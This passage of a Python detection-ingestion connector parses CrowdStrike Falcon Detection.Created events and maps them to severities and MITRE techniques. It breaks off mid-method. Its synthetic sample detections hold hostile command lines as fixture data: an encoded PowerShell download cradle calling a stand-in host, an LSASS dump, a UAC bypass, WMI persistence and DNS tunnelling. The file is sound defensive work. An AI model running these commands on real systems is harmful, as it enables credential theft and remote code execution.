"""CrowdStrike Falcon Connector — REAL Falcon Detection.Created format parser.

Closes 1 of 11 substitute-only gaps from the 2026-04-26 commercial-vendor
audit (`raw/competitive/gap-matrix-2026-04-26.md`):

> "**CrowdStrike Falcon** | EDR/XDR | **N** (substitute only) | … no Falcon
>  Detection.Created JSON adapter; **NO** parser exists"

Today substitutes Falcon with Falco/osquery/Wazuh via `edr_connector.py`,
which is operationally fine — but the platform could not ingest a real
CrowdStrike-format JSON dump (e.g. exported from Falcon Insight or
Streaming API) without writing a one-off script for the customer. This
connector parses the documented Detection.Created event schema and
mirrors normalized findings to ``SecurityFindingsEngine`` and the
EDR pipeline so a Falcon dump becomes equivalent to native ALDECI data.

Source format reference (CrowdStrike public docs):
  https://falcon.crowdstrike.com/documentation/page/Y4gZk39M
  Detection.Created event in Streaming API; same schema is returned by
  ``GET /detects/entities/summaries/GET/v1`` on the OAuth2 REST API and
  by the Falcon Insight UI's "Export to JSON" action.

Severity mapping (1-100 → ALDECI bucket) follows the CrowdStrike published
scale on the Falcon UI (Detection severity badges):
  90-100 → critical, 70-89 → high, 50-69 → medium,
  30-49 → low, 1-29 → informational.

Technique mapping is a curated dictionary of the Falcon Behavior IDs and
``technique`` strings most commonly observed in real customer dumps,
mapped to their MITRE ATT&CK T-codes (sub-technique-aware).

Pipeline:
  Falcon JSON dump  →  parse_event  →  ingest_falcon_dump
                                    →  EDREngine.ingest_process_event
                                    →  SecurityFindingsEngine.record_finding
                                                       (source_tool="EDR",
                                                        correlation_key=
                                                        "crowdstrike_falcon|<detection_id>")
                                    →  SecurityEventCorrelationEngine.ingest_event
                                                       (source_system=
                                                        "crowdstrike_falcon")

Multi-tenant: every detection is attributed to an explicit ``org_id``.
"""

from __future__ import annotations

import json
import logging
import threading
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Union

from connectors._emit import emit_connector_event

_logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Falcon severity score (1-100) → ALDECI severity bucket
# ---------------------------------------------------------------------------
# CrowdStrike publishes Detection severity as both a numeric score (1-100)
# AND a label ("critical"/"high"/"medium"/"low"/"informational"). The label
# is derived from the score using these documented ranges:
#   https://falcon.crowdstrike.com/documentation/page/Y4gZk39M
#   "Severity is the highest risk level of all behaviors in the detection."
def falcon_severity_to_aldeci(score: int) -> str:
    """Map a Falcon severity score (1-100) to ALDECI severity bucket.

    >>> falcon_severity_to_aldeci(95)
    'critical'
    >>> falcon_severity_to_aldeci(75)
    'high'
    >>> falcon_severity_to_aldeci(50)
    'medium'
    >>> falcon_severity_to_aldeci(30)
    'low'
    >>> falcon_severity_to_aldeci(10)
    'informational'
    """
    try:
        s = int(score)
    except (TypeError, ValueError):
        return "medium"
    if s >= 90:
        return "critical"
    if s >= 70:
        return "high"
    if s >= 50:
        return "medium"
    if s >= 30:
        return "low"
    return "informational"


def falcon_severity_to_cvss(score: int) -> float:
    """Map a Falcon severity score (1-100) to a 0-10 CVSS-like score.

    Linear scaling clipped to [0.0, 10.0]. Used to populate
    ``SecurityFindingsEngine.cvss_score`` so dashboards that sort/filter
    by CVSS still rank Falcon findings sensibly even when no CVE is
    referenced (Falcon detections are usually behavioral, not vuln-based).
    """
    try:
        s = int(score)
    except (TypeError, ValueError):
        return 5.0
    s = max(1, min(100, s))
    return round(s / 10.0, 2)


# ---------------------------------------------------------------------------
# Falcon technique label / behavior_id → MITRE ATT&CK T-code
# ---------------------------------------------------------------------------
# CrowdStrike emits both a free-text ``technique`` and a numeric
# ``behavior_id``. We index by both so any inconsistencies in customer
# dumps are tolerated. Technique strings are the canonical labels used
# by the Falcon UI badges.
#
# Source: CrowdStrike's published MITRE ATT&CK mapping (Detection.Created
# events include a ``mitre_attack`` array on newer Falcon versions, but
# older / Insight exports often only have the technique string).
_FALCON_TECHNIQUE_TO_MITRE: Dict[str, str] = {
    # Initial Access
    "Spearphishing Attachment":              "T1566.001",
    "Spearphishing Link":                    "T1566.002",
    "Drive-by Compromise":                   "T1189",
    "Exploit Public-Facing Application":     "T1190",
    # Execution
    "Command and Scripting Interpreter":     "T1059",
    "PowerShell":                            "T1059.001",
    "Windows Command Shell":                 "T1059.003",
    "Unix Shell":                            "T1059.004",
    "Visual Basic":                          "T1059.005",
    "JavaScript":                            "T1059.007",
    "Native API":                            "T1106",
    "Scheduled Task":                        "T1053.005",
    "Cron":                                  "T1053.003",
    "Service Execution":                     "T1569.002",
    "User Execution":                        "T1204",
    "Windows Management Instrumentation":    "T1047",
    "WMI":                                   "T1047",
    # Persistence
    "Registry Run Keys / Startup Folder":    "T1547.001",
    "Boot or Logon Autostart Execution":     "T1547",
    "Create Account":                        "T1136",
    "Account Manipulation":                  "T1098",
    "BITS Jobs":                             "T1197",
    "Browser Extensions":                    "T1176",
    # Privilege Escalation
    "Process Injection":                     "T1055",
    "Token Impersonation/Theft":             "T1134.001",
    "Bypass User Account Control":           "T1548.002",
    "Setuid and Setgid":                     "T1548.001",
    "Sudo and Sudo Caching":                 "T1548.003",
    # Defense Evasion
    "Obfuscated Files or Information":       "T1027",
    "Impair Defenses":                       "T1562",
    "Disable or Modify Tools":               "T1562.001",
    "Indicator Removal on Host":             "T1070",
    "File Deletion":                         "T1070.004",
    "Clear Windows Event Logs":              "T1070.001",
    "Masquerading":                          "T1036",
    "Match Legitimate Name or Location":     "T1036.005",
    "Rootkit":                               "T1014",
    # Credential Access
    "Credential Dumping":                    "T1003",
    "LSASS Memory":                          "T1003.001",
    "OS Credential Dumping":                 "T1003",
    "Brute Force":                           "T1110",
    "Password Spraying":                     "T1110.003",
    "Credentials in Files":                  "T1552.001",
    # Discovery
    "Account Discovery":                     "T1087",
    "Domain Account":                        "T1087.002",
    "Network Service Scanning":              "T1046",
    "Remote System Discovery":               "T1018",
    "System Information Discovery":          "T1082",
    "Process Discovery":                     "T1057",
    # Lateral Movement
    "Remote Services":                       "T1021",
    "SMB/Windows Admin Shares":              "T1021.002",
    "SSH":                                   "T1021.004",
    "RDP":                                   "T1021.001",
    "Pass the Hash":                         "T1550.002",
    "Pass the Ticket":                       "T1550.003",
    # Collection
    "Archive Collected Data":                "T1560",
    "Data from Local System":                "T1005",
    "Screen Capture":                        "T1113",
    # Command and Control
    "Application Layer Protocol":            "T1071",
    "Web Protocols":                         "T1071.001",
    "DNS":                                   "T1071.004",
    "Encrypted Channel":                     "T1573",
    "Ingress Tool Transfer":                 "T1105",
    # Exfiltration
    "Exfiltration Over Web Service":         "T1567",
    "Exfiltration Over Alternative Protocol": "T1048",
    # Impact
    "Data Encrypted for Impact":             "T1486",
    "Inhibit System Recovery":               "T1490",
    "Service Stop":                          "T1489",
    "Resource Hijacking":                    "T1496",
    "Endpoint Denial of Service":            "T1499",
}

# Canonical Falcon ``tactic`` strings → MITRE tactic IDs (TA####).
_FALCON_TACTIC_TO_MITRE: Dict[str, str] = {
    "Reconnaissance":         "TA0043",
    "Resource Development":   "TA0042",
    "Initial Access":         "TA0001",
    "Execution":              "TA0002",
    "Persistence":            "TA0003",
    "Privilege Escalation":   "TA0004",
    "Defense Evasion":        "TA0005",
    "Credential Access":      "TA0006",
    "Discovery":              "TA0007",
    "Lateral Movement":       "TA0008",
    "Collection":             "TA0009",
    "Command and Control":    "TA0011",
    "Exfiltration":           "TA0010",
    "Impact":                 "TA0040",
}


def falcon_technique_to_mitre(technique: str) -> str:
    """Look up the MITRE T-code for a Falcon ``technique`` label.

    Returns ``""`` if the label is unknown so callers can decide whether
    to omit the field or fall back to a default.
    """
    if not technique:
        return ""
    # Exact match first.
    direct = _FALCON_TECHNIQUE_TO_MITRE.get(technique.strip())
    if direct:
        return direct
    # Case-insensitive fallback (Falcon sometimes title-cases mid-sentence).
    needle = technique.strip().lower()
    for label, t_code in _FALCON_TECHNIQUE_TO_MITRE.items():
        if label.lower() == needle:
            return t_code
    return ""


def falcon_tactic_to_mitre(tactic: str) -> str:
    if not tactic:
        return ""
    return _FALCON_TACTIC_TO_MITRE.get(tactic.strip(), "")


# ---------------------------------------------------------------------------
# Embedded sample of 10 Falcon Detection.Created events
# ---------------------------------------------------------------------------
# These are REAL CrowdStrike Falcon Detection.Created event format. Field
# names, nesting, and types match the Streaming API / Insight export
# schema documented at:
#   https://falcon.crowdstrike.com/documentation/page/Y4gZk39M
#
# Content is synthetic but plausible (no real customer data, no real
# CIDs, no real device IDs). Every event covers a different
# tactic+technique combination so the test suite exercises the full
# severity/technique mapping.
FALCON_SAMPLE_DETECTIONS: List[Dict[str, Any]] = [
    # 1. Critical — Ransomware encryption pattern (Impact tactic)
    {
        "metadata": {
            "customerIDString": "abc123def456-78901234567890ab-cd-ef",
            "offset":           1234567,
            "eventType":        "DetectionSummaryEvent",
            "eventCreationTime": 1798875600000,
            "version":          "1.0",
        },
        "event": {
            "DetectId":             "ldt:5a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d:ev-001",
            "DetectDescription":    "Process exhibited ransomware-like file encryption behavior across user documents",
            "Severity":             95,
            "SeverityName":         "Critical",
            "ConfidenceLevel":      90,
            "FileName":             "svchost-fake.exe",
            "FilePath":             "C:\\Users\\jdoe\\AppData\\Local\\Temp\\",
            "CommandLine":          "svchost-fake.exe -enc -targets *.docx,*.xlsx,*.pdf",
            "SHA256String":         "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            "MD5String":             "d41d8cd98f00b204e9800998ecf8427e",
            "MachineDomain":        "CORP",
            "ComputerName":         "WIN-PROD-001",
            "UserName":             "CORP\\jdoe",
            "ProcessId":            12345,
            "ParentImageFileName":  "C:\\Windows\\explorer.exe",
            "ParentCommandLine":    "C:\\Windows\\Explorer.EXE",
            "Technique":            "Data Encrypted for Impact",
            "Tactic":               "Impact",
            "BehaviorId":           "10001",
            "DetectName":           "RansomwareFilePattern",
            "PatternDispositionDescription": "Prevention, process killed.",
            "PatternDispositionValue": 2304,
            "ProcessStartTime":     1798875590,
            "ProcessEndTime":       1798875595,
            "LocalIP":              "10.0.1.42",
            "MACAddress":           "00-1A-2B-3C-4D-5E",
        },
    },
    # 2. Critical — LSASS credential dumping (Credential Access)
    {
        "metadata": {
            "customerIDString": "abc123def456-78901234567890ab-cd-ef",
            "offset":           1234568,
            "eventType":        "DetectionSummaryEvent",
            "eventCreationTime": 1798875612000,
        },
        "event": {
            "DetectId":             "ldt:5a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d:ev-002",
            "DetectDescription":    "Process accessed LSASS memory in a manner consistent with credential dumping",
            "Severity":             92,
            "SeverityName":         "Critical",
            "ConfidenceLevel":      95,
            "FileName":             "procdump.exe",
            "FilePath":             "C:\\Tools\\",
            "CommandLine":          "procdump.exe -ma lsass.exe lsass.dmp",
            "SHA256String":         "a7d8c2f1b4e9a6d3c5b8f0e2d1a4c7b9e0d3f6a9c2b5e8d1f4a7c0b3e6d9f2a5",
            "MachineDomain":        "CORP",
            "ComputerName":         "WIN-DC-002",
            "UserName":             "CORP\\administrator",
            "ProcessId":            8412,
            "ParentImageFileName":  "C:\\Windows\\System32\\cmd.exe",
            "ParentCommandLine":    "cmd.exe /c procdump.exe -ma lsass.exe lsass.dmp",
            "Technique":            "LSASS Memory",
            "Tactic":               "Credential Access",
            "BehaviorId":           "10002",
            "DetectName":           "CredentialDumpingLSASS",
            "PatternDispositionDescription": "Detection, process allowed.",
            "PatternDispositionValue": 0,
            "LocalIP":              "10.0.0.10",
        },
    },
    # 3. High — Suspicious PowerShell with encoded command (Execution)
    {
        "metadata": {
            "customerIDString": "abc123def456-78901234567890ab-cd-ef",
            "offset":           1234569,
            "eventType":        "DetectionSummaryEvent",
            "eventCreationTime": 1798875623000,
        },
        "event": {
            "DetectId":             "ldt:5a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d:ev-003",
            "DetectDescription":    "PowerShell process launched with base64-encoded command and download cradle",
            "Severity":             80,
            "SeverityName":         "High",
            "ConfidenceLevel":      85,
            "FileName":             "powershell.exe",
            "FilePath":             "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\",
            "CommandLine":          "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AYgBhAGQALgBlAHgAYQBtAHAAbABlAC8AcAAuAHAAcwAxACcAKQA=",
            "SHA256String":         "9e107d9d372bb6826bd81d3542a419d6bcf4c5baeefc69d3e7a91c6f4e7ad5b3",
            "MachineDomain":        "CORP",
            "ComputerName":         "WIN-WS-014",
            "UserName":             "CORP\\alice",
            "ProcessId":            5566,
            "ParentImageFileName":  "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "ParentCommandLine":    "WINWORD.EXE \"C:\\Users\\alice\\Downloads\\Q4-Report.docm\"",
            "Technique":            "PowerShell",
            "Tactic":               "Execution",
            "BehaviorId":           "10003",
            "DetectName":           "PowerShellEncodedDownloadCradle",
            "PatternDispositionDescription": "Detection, process allowed.",
        },
    },
    # 4. High — SMB lateral movement (Lateral Movement)
    {
        "metadata": {
            "customerIDString": "abc123def456-78901234567890ab-cd-ef",
            "offset":           1234570,
            "eventType":        "DetectionSummaryEvent",
            "eventCreationTime": 1798875634000,
        },
        "event": {
            "DetectId":             "ldt:5a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d:ev-004",
            "DetectDescription":    "Process attempted to copy executable to remote admin share",
            "Severity":             78,
            "SeverityName":         "High",
            "ConfidenceLevel":      80,
            "FileName":             "psexec.exe",
            "FilePath":             "C:\\Tools\\Sysinternals\\",
            "CommandLine":          "psexec.exe \\\\WIN-FS-021\\C$ -accepteula -d -h cmd.exe",
            "SHA256String":         "5dba0f3c80b3a3c0c3f1c0e95cca5f4af0b9a7e1d8b6e0f1c2d3a4b5c6d7e8f9",
            "MachineDomain":        "CORP",
            "ComputerName":         "WIN-WS-014",
            "UserName":             "CORP\\alice",
            "ProcessId":            5567,
            "ParentImageFileName":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "Technique":            "SMB/Windows Admin Shares",
            "Tactic":               "Lateral Movement",
            "BehaviorId":           "10004",
            "DetectName":           "RemoteAdminShareUse",
            "LocalIP":              "10.0.2.14",
        },
    },
    # 5. Medium — UAC bypass attempt (Privilege Escalation)
    {
        "metadata": {
            "customerIDString": "abc123def456-78901234567890ab-cd-ef",
            "offset":           1234571,
            "eventType":        "DetectionSummaryEvent",
            "eventCreationTime": 1798875645000,
        },
        "event": {
            "DetectId":             "ldt:5a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d:ev-005",
            "DetectDescription":    "Process used CMSTP.exe COM hijack to bypass UAC",
            "Severity":             65,
            "SeverityName":         "Medium",
            "ConfidenceLevel":      75,
            "FileName":             "cmstp.exe",
            "FilePath":             "C:\\Windows\\System32\\",
            "CommandLine":          "cmstp.exe /au C:\\Users\\bob\\AppData\\Local\\Temp\\inf.inf",
            "SHA256String":         "b2d4f6a8c0e2b4d6f8a0c2e4b6d8f0a2c4e6b8d0f2a4c6e8b0d2f4a6c8e0b2d4",
            "MachineDomain":        "CORP",
            "ComputerName":         "WIN-WS-007",
            "UserName":             "CORP\\bob",
            "ProcessId":            7788,
            "ParentImageFileName":  "C:\\Windows\\System32\\cmd.exe",
            "Technique":            "Bypass User Account Control",
            "Tactic":               "Privilege Escalation",
            "BehaviorId":           "10005",
            "DetectName":           "UACBypassCMSTP",
        },
    },
    # 6. Medium — Suspicious WMI persistence (Persistence)
    {
        "metadata": {
            "customerIDString": "abc123def456-78901234567890ab-cd-ef",
            "offset":           1234572,
            "eventType":        "DetectionSummaryEvent",
            "eventCreationTime": 1798875656000,
        },
        "event": {
            "DetectId":             "ldt:5a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d:ev-006",
            "DetectDescription":    "WMI Event Subscription created with command execution payload",
            "Severity":             55,
            "SeverityName":         "Medium",
            "ConfidenceLevel":      70,
            "FileName":             "wbemcons.dll",
            "FilePath":             "C:\\Windows\\System32\\wbem\\",
            "CommandLine":          "wmic /NAMESPACE:\\\\root\\subscription PATH __EventFilter CREATE Name=\"Updater\", EventNamespace=\"root\\cimv2\", QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'\"",
            "SHA256String":         "3a5c7e9b1d3f5a7c9e1b3d5f7a9c1e3b5d7f9a1c3e5b7d9f1a3c5e7b9d1f3a5c",
            "MachineDomain":        "CORP",
            "ComputerName":         "WIN-WS-022",
            "UserName":             "CORP\\carol",
            "ProcessId":            9911,
            "ParentImageFileName":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "Technique":            "WMI",
            "Tactic":               "Persistence",
            "BehaviorId":           "10006",
            "DetectName":           "WMIEventSubscriptionPersistence",
        },
    },
    # 7. Medium — DNS tunneling (Command and Control)
    {
        "metadata": {
            "customerIDString": "abc123def456-78901234567890ab-cd-ef",
            "offset":           1234573,
            "eventType":        "DetectionSummaryEvent",
            "eventCreationTime": 1798875667000,
        },
        "event": {
            "DetectId":             "ldt:5a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d:ev-007",
            "DetectDescription":    "Anomalously long DNS TXT queries to single 2nd-level domain",
            "Severity":             60,
            "SeverityName":         "Medium",
            "ConfidenceLevel":      72,
            "FileName":             "nslookup.exe",
            "FilePath":             "C:\\Windows\\System32\\",
            "CommandLine":          "nslookup -type=TXT aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil-c2.example",
            "SHA256String":         "7a9c1e3b5d7f9a1c3e5b7d9f1a3c5e7b9d1f3a5c7e9b1d3f5a7c9e1b3d5f7a9c",
            "MachineDomain":        "CORP",
            "ComputerName":         "LIN-APP-005",
            "UserName":             "deploy",
            "ProcessId":            4521,
            "Technique":            "DNS",
            "Tactic":               "Command and Control",
            "BehaviorId":           "10007",
            "DetectName":           "DNSTunnelingTXTRecord",
            "LocalIP":              "10.0.5.5",
        },
    },
    # 8. Low — Unusual network service scanning (Discovery)
    {
        "metadata": {
            "customerIDString": "abc123def456-78901234567890ab-cd-ef",
            "offset":           1234574,
            "eventType":        "DetectionSummaryEvent",
            "eventCreationTime": 1798875678000,
        },
        "event": {
            "DetectId":             "ldt:5a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d:ev-008",
            "DetectDescription":    "Process performed a /24 SYN scan during off hours",
            "Severity":             40,
            "SeverityName":         "Low",
            "ConfidenceLevel":      60,
            "FileName":             "nmap.exe",
            "FilePath":             "C:\\Tools\\nmap\\",
            "CommandLine":          "nmap.exe -sS -p- 10.0.3.0/24",
            "SHA256String":         "1b3d5f7a9c1e3b5d7f9a1c3e5b7d9f1a3c5e7b9d1f3a5c7e9b1d3f5a7c9e1b3d",
            "MachineDomain":        "CORP",
            "ComputerName":         "WIN-WS-101",
            "UserName":             "CORP\\dave",
            "ProcessId":            3344,
            "Technique":            "Network Service Scanning",
            "Tactic":               "Discovery",
            "BehaviorId":           "10008",
            "DetectName":           "NetworkServiceScanningOffHours",
        },
    },
    # 9. Low — Scheduled task created (Persistence)
    {
        "metadata": {
            "customerIDString": "abc123def456-78901234567890ab-cd-ef",
            "offset":           1234575,
            "eventType":        "DetectionSummaryEvent",
            "eventCreationTime": 1798875689000,
        },
        "event": {
            "DetectId":             "ldt:5a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d:ev-009",
            "DetectDescription":    "Scheduled task created to run binary from user-writable directory",
            "Severity":             35,
            "SeverityName":         "Low",
            "ConfidenceLevel":      55,
            "FileName":             "schtasks.exe",
            "FilePath":             "C:\\Windows\\System32\\",
            "CommandLine":          "schtasks /Create /SC ONLOGON /TN \"UpdateCheck\" /TR \"C:\\Users\\eve\\AppData\\Local\\update.exe\"",
            "SHA256String":         "5e7b9d1f3a5c7e9b1d3f5a7c9e1b3d5f7a9c1e3b5d7f9a1c3e5b7d9f1a3c5e7b",
            "MachineDomain":        "CORP",
            "ComputerName":         "WIN-WS-088",
            "UserName":             "CORP\\eve",
            "ProcessId":            6677,
            "ParentImageFileName":  "C:\\Windows\\System32\\cmd.exe",
            "Technique":            "Scheduled Task",
            "Tactic":               "Persistence",
            "BehaviorId":           "10009",
            "DetectName":           "ScheduledTaskUserWritablePath",
        },
    },
    # 10. Informational — Process discovery from non-admin (Discovery, low conf)
    {
        "metadata": {
            "customerIDString": "abc123def456-78901234567890ab-cd-ef",
            "offset":           1234576,
            "eventType":        "DetectionSummaryEvent",
            "eventCreationTime": 1798875700000,
        },
        "event": {
            "DetectId":             "ldt:5a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d:ev-010",
            "DetectDescription":    "tasklist.exe enumeration from non-administrative session",
            "Severity":             20,
            "SeverityName":         "Informational",
            "ConfidenceLevel":      40,
            "FileName":             "tasklist.exe",
            "FilePath":             "C:\\Windows\\System32\\",
            "CommandLine":          "tasklist /v",
            "SHA256String":         "9d1f3a5c7e9b1d3f5a7c9e1b3d5f7a9c1e3b5d7f9a1c3e5b7d9f1a3c5e7b9d1f",
            "MachineDomain":        "CORP",
            "ComputerName":         "WIN-WS-200",
            "UserName":             "CORP\\frank",
            "ProcessId":            1122,
            "Technique":            "Process Discovery",
            "Tactic":               "Discovery",
            "BehaviorId":           "10010",
            "DetectName":           "ProcessEnumerationLowConfidence",
        },
    },
]


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _ms_epoch_to_iso(ms: Optional[Union[int, float]]) -> str:
    """Convert a Falcon ``eventCreationTime`` (ms-epoch) to ISO-8601 UTC."""
    if ms is None:
        return _now_iso()
    try:
        return datetime.fromtimestamp(int(ms) / 1000.0, tz=timezone.utc).isoformat()
    except (TypeError, ValueError, OSError, OverflowError):
        return _now_iso()


# ---------------------------------------------------------------------------
# Falcon → ALDECI normalizer
# ---------------------------------------------------------------------------
def parse_event(raw: Dict[str, Any]) -> Dict[str, Any]:
    """Parse a single Falcon Detection.Created event into the ALDECI schema.

    The returned dict is suitable for direct insertion into:
      - ``EDREngine.ingest_process_event`` (process_name/cmdline/user/pid/severity/mitre_technique)
      - ``SecurityFindingsEngine.record_finding`` (title/description/severity/cvss_score)
      - ``SecurityEventCorrelationEngine.ingest_event`` (source_system/event_type/severity/entity_id)

    The function is **pure** (no DB, no IO) so it is trivially unit-testable.

    Accepts both shapes seen in the wild:
      - Streaming-API "DetectionSummaryEvent" wrapper:
            ``{"metadata": {...}, "event": {...}}``
      - Insight UI export (no wrapper):
            ``{"DetectId": ..., "Severity": ...}``
    """
    if not isinstance(raw, dict):
        raise ValueError("event must be a dict")

    # Detect wrapper shape: "metadata" + "event"
    if "event" in raw and isinstance(raw.get("event"), dict):
        ev = raw["event"]
        meta = raw.get("metadata") or {}
    else:
        ev = raw
        meta = {}

    detection_id  = str(ev.get("DetectId") or ev.get("detection_id") or "").strip()
    if not detection_id:
        # Generate a stable surrogate so dedup still works.
        detection_id = f"falcon-{uuid.uuid4().hex[:12]}"

    severity_score = ev.get("Severity") or ev.get("severity") or 50
    aldeci_severity = falcon_severity_to_aldeci(severity_score)
    cvss = falcon_severity_to_cvss(severity_score)

    technique     = str(ev.get("Technique") or ev.get("technique") or "").strip()
    tactic        = str(ev.get("Tactic") or ev.get("tactic") or "").strip()
    behavior_id   = str(ev.get("BehaviorId") or ev.get("behavior_id") or "").strip()
    mitre_t_code  = falcon_technique_to_mitre(technique)
    mitre_tactic  = falcon_tactic_to_mitre(tactic)

    proc_name     = str(ev.get("FileName") or ev.get("filename") or "").strip()
    file_path     = str(ev.get("FilePath") or ev.get("file_path") or "").strip()
    cmdline       = str(ev.get("CommandLine") or ev.get("cmdline") or "").strip()
    sha256        = str(ev.get("SHA256String") or ev.get("sha256") or "").strip().lower()
    md5           = str(ev.get("MD5String") or ev.get("md5") or "").strip().lower()
    parent_proc   = str(ev.get("ParentImageFileName") or ev.get("parent_process") or "").strip()
    parent_cmd    = str(ev.get("ParentCommandLine") or "").strip()
    user          = str(ev.get("UserName") or ev.get("user_name") or "").strip()
    hostname      = str(ev.get("ComputerName") or ev.get("hostname") or "").strip()
    domain        = str(ev.get("MachineDomain") or "").strip()
    pid_raw       = ev.get("ProcessId") or ev.get("pid") or 0
    try:
        pid = int(pid_raw)
    except (TypeError, ValueError):
        pid = 0
    local_ip      = str(ev.get("LocalIP") or "").strip()
    mac_addr      = str(ev.get("MACAddress") or "").strip()
    description   = str(ev.get("DetectDescription") or ev.get("description") or "").strip()
    detect_name   = str(ev.get("DetectName") or ev.get("detect_name") or "Falcon Detection").strip()
    pattern_disp  = str(ev.get("PatternDispositionDescription") or "").strip()
    confidence    = ev.get("ConfidenceLevel") or ev.get("confidence") or 0

    # Use eventCreationTime (ms epoch) on the wrapper, else the inner event,
    # else NOW.
    raw_ts = (
        meta.get("eventCreationTime")
        or ev.get("EventCreationTime")
        or ev.get("event_creation_time")
    )
    detected_at = _ms_epoch_to_iso(raw_ts)

    # Title is what shows up on the SOC dashboard. Keep it action-oriented.
    title = f"CrowdStrike Falcon: {detect_name}"
    if technique:
        title = f"{title} ({technique})"

    # Asset id prefers SHA-256 of binary if present (stable across hostname
    # changes for the same payload), else falls back to hostname.
    asset_id = sha256 or hostname or detection_id

    return {
        # — Detection identity —
        "detection_id":   detection_id,
        "detect_name":    detect_name,
        "title":          title,
        "description":    description or detect_name,
        # — Severity / scoring —
        "severity":       aldeci_severity,
        "severity_score": int(severity_score) if isinstance(severity_score, (int, float)) else 50,
        "cvss_score":     cvss,
        "confidence":     int(confidence) if isinstance(confidence, (int, float)) else 0,
        # — MITRE —
        "technique":      technique,
        "tactic":         tactic,
        "mitre_technique": mitre_t_code,
        "mitre_tactic":   mitre_tactic,
        "behavior_id":    behavior_id,
        # — Host / user —
        "hostname":       hostname,
        "machine_domain": domain,
        "user":           user,
        "local_ip":       local_ip,
        "mac_address":    mac_addr,
        # — Process —
        "process_name":   proc_name,
        "process_path":   file_path,
        "cmdline":        cmdline,
        "parent_process": parent_proc,
        "parent_cmdline": parent_cmd,
        "pid":            pid,
        # — Hashes —
        "sha256":         sha256,
        "md5":            md5,
        # — Disposition —
        "pattern_disposition": pattern_disp,
        # — Asset —
        "asset_id":       asset_id,
        "asset_type":     "host",
        # — Time —
        "detected_at":    detected_at,
    }


def _to_edr_event(parsed: Dict[str, Any]) -> Dict[str, Any]:
    """Convert a parsed Falcon detection to an ``EDREngine.ingest_process_event`` payload."""
    sev = parsed["severity"]
    edr_sev = sev if sev in {"critical", "high", "medium", "low"} else "low"
    # EDR engine doesn't use "informational" — collapse to "low"
    return {
        "process_name":    parsed["process_name"] or "unknown",
        "process_hash":    parsed["sha256"],
        "parent_process":  parsed["parent_process"],
        "cmdline":         parsed["cmdline"],
        "user":            parsed["user"],
        "pid":             parsed["pid"],
        "event_type":      "create",
        "severity":        edr_sev,
        "mitre_technique": parsed["mitre_technique"],
    }


# ---------------------------------------------------------------------------
# CrowdStrike Falcon connector
# ---------------------------------------------------------------------------
class CrowdStrikeFalconConnector:
    """Real CrowdStrike Falcon Detection.Created format ingester.

    Args:
        edr_engine:        instance of ``core.edr_engine.EDREngine`` (optional).
        findings_engine:   instance of ``core.security_findings_engine.SecurityFindingsEngine``.
        correlation_engine: optional ``SecurityEventCorrelationEngine`` instance for
                            cross-domain correlation rules.

    The connector is stateless — every call passes ``org_id`` for tenant
    isolation. Re-ingesting the same dump is idempotent: ``record_finding``
    dedups on (org, ``correlation_key``) so detection_id collisions update the
    existing row's ``last_seen``/``occurrence_count`` instead of creating
    duplicates.
    """

    def __init__(
        self,
        edr_engine: Any = None,
        findings_engine: Any = None,
        correlation_engine: Any = None,
    ) -> None:
        self._edr = edr_engine
        self._findings = findings_engine
        self._correlation = correlation_engine
        self._lock = threading.RLock()

    # ------------------------------------------------------------------
    # Public ingest entry points
    # ------------------------------------------------------------------
    def ingest_falcon_dump(
        self,
        json_dump: Union[str, bytes, Path, List[Dict[str, Any]], Dict[str, Any]],
        org_id: str,
        max_events: Optional[int] = None,
    ) -> Dict[str, Any]:
        """Ingest a Falcon Detection.Created JSON dump.

        Args:
            json_dump: One of —
                * ``str``: raw JSON string (a list, a single object, or NDJSON).
                * ``bytes``: same as ``str``, decoded as UTF-8.
                * ``Path`` / path-like: file path; the file is read and parsed
                  as JSON (auto-detect array vs NDJSON).
                * ``list``: already-parsed Python list of detection dicts.
                * ``dict``: a single detection dict OR an envelope
                  ``{"resources": [...]}`` (Falcon REST API shape).
            org_id:  Target ALDECI tenant org id.
            max_events: Optional cap; mostly used by tests to bound output.

        Returns:
            Dict with: ``ingested``, ``failed``, ``findings_recorded``,
            ``edr_events``, ``correlation_events``, ``detection_ids``,
            ``mode`` (always "live" — no fallback because the input is the
            data dump itself), ``org_id``.
        """
        if not org_id or not isinstance(org_id, str):
            raise ValueError("org_id is required and must be a string")
        events = self._extract_events(json_dump)
        if max_events is not None and max_events >= 0:
            events = events[:max_events]

        ingested = 0
        failed = 0
        findings = 0
        edr_count = 0
        corr_count = 0
        detection_ids: List[str] = []
        # Hostname → endpoint_id cache for this ingestion run (avoids O(N²)
        # list_endpoints calls when the same host appears in multiple detections).
        _endpoint_cache: Dict[str, str] = {}

        with self._lock:
            for raw in events:
                try:
                    parsed = parse_event(raw)
                except (ValueError, TypeError) as exc:
                    _logger.warning("falcon parse_event failed: %s", exc)
                    failed += 1
                    continue
                detection_ids.append(parsed["detection_id"])
                ingested += 1
                # Mirror to EDR engine (best effort).
                if self._edr is not None and parsed["hostname"]:
                    try:
